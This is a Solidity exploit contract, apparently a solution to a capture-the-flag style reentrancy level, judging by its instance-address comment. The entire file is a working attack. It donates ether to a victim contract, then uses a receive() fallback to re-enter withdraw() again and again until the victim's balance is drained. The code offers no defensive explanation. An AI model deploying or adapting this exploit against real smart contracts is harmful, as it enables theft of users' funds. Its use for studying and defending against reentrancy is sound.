//Instance Address: 0x8583bBC06F5DBE46dcFA2F154554ba2c788a15d7

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract Attack {
    IReentrancy public victim;
    uint256 initialDeposit;

    constructor(address victimAddress) {
        victim = IReentrancy(victimAddress);
    }

    function attack() external payable {
        initialDeposit = msg.value;
        victim.donate{value: initialDeposit}(address(this));

        maliciousWithdrawal();
    }

    receive() external payable {
        maliciousWithdrawal();
    }

    function maliciousWithdrawal() private {
        // this balance correctly updates after withdraw
        uint256 remainingBalanceInContract = address(victim).balance;
        // are there more tokens to empty?
        bool keepRecursing = remainingBalanceInContract > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < remainingBalanceInContract
                    ? initialDeposit
                    : remainingBalanceInContract;
            victim.withdraw(toWithdraw);
        }
    }
}